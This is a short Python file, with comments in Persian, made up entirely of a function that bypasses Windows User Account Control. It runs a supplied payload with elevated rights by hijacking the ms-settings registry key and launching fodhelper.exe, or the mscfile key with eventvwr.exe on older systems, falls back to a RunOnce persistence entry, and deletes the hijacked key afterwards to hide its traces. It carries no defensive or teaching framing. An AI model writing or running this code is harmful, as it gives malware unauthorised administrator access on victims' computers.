import sys
import os
import subprocess
import time
import ctypes
import winreg
from typing import Optional

def exploit_windows_uac_bypass(payload_path: str) -> bool:
    try:
        # اگر قبلاً Admin هستیم، payload را اجرا کن
        if ctypes.windll.shell32.IsUserAnAdmin():
            subprocess.Popen([payload_path], shell=True)
            return True

        ver = sys.getwindowsversion()
        major, minor = ver.major, ver.minor

        def _hijack(root, subkey, exe):
            # نوشتن کلید هکی
            key = winreg.CreateKey(root, subkey)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, payload_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            # اجرای اجراگر
            subprocess.Popen([exe], shell=True)
            time.sleep(2)
            # پاکسازی
            winreg.DeleteKey(root, subkey)

        # Windows 10+ → fodhelper
        if major >= 10:
            _hijack(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\ms-settings\shell\open\command",
                "fodhelper.exe"
            )
            return True

        # Windows 7/8 → eventvwr
        if major == 6 and minor in (1, 2, 3):
            _hijack(
                winreg.HKEY_CURRENT_USER,
                r"Software\Classes\mscfile\shell\open\command",
                "eventvwr.exe"
            )
            return True

        # قدیمی‌تر (Vista/XP) → RunOnce
        runonce = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, runonce, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UACBypass", 0, winreg.REG_SZ, payload_path)
        winreg.CloseKey(key)
        # برای اعمال، کاربر باید لاگ‌آف/آن‌لاین شود
        return True

    except Exception:
        return False